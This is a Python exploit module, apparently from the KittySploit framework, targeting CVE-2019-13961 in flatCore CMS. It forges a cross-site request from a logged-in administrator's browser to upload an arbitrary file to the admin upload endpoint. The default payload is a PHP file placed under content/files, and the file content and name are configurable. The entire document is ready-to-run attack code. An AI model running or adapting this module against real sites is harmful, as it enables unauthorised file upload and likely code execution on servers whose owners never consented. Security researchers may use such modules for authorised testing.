from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "flatCore CVE-2019-13961 CSRF",
		"description": "flatCore CMS - CSRF vulnerability in file upload endpoint (CVE-2019-13961)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
		"CVE": "2019-13961",
		"references": [
			"CVE-2019-13961",
			"https://github.com/flatCore/flatCore-CMS"
		],
	}
	
	target = OptString("http://flatcore3", "Target flatCore URL (with http://)", required=True)
	file_content = OptString("<?php phpinfo(); ?>", "Content of the file to upload", required=True)
	file_name = OptString("test.php", "Name of the file to upload", required=True)
	upload_destination = OptString("../content/files", "Upload destination path", required=True)
	width = OptString("800", "Image width (w parameter)", required=False)
	height = OptString("600", "Image height (h parameter)", required=False)
	max_file_size = OptString("1000", "Max file size in KB (fz parameter)", required=False)

	def run(self):
		"""Execute CSRF POST attack to upload file in flatCore CMS"""
		url = f"{self.target}/acp/core/files.upload-script.php"
		
		# Additional form parameters
		additional_params = {
			"upload_destination": self.upload_destination,
			"w": self.width,
			"h": self.height,
			"fz": self.max_file_size,
			"unchanged": "yes"
		}
		
		print_info(f"Executing CSRF file upload attack on: {self.target}")
		print_info(f"Target: {url}")
		print_info(f"File name: {self.file_name}")
		print_info(f"Upload destination: {self.upload_destination}")
		print_info(f"File content preview: {self.file_content[:50]}...")
		print_warning("CVE-2019-13961: This vulnerability allows arbitrary file upload via CSRF")
		
		# Use the file upload method
		js_code = self.csrf_file_upload(
			url=url,
			file_content=self.file_content,
			file_name=self.file_name,
			file_field_name="file",
			additional_params=additional_params
		)
		
		result = self.send_js_and_wait_for_response(js_code, timeout=15.0)
		
		if result:
			print_success("CSRF file upload attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"File upload request sent: {self.file_name}")
			print_info(f"Destination: {self.upload_destination}")
			return True
		else:
			fail.CSRFPostFailed()
		return False

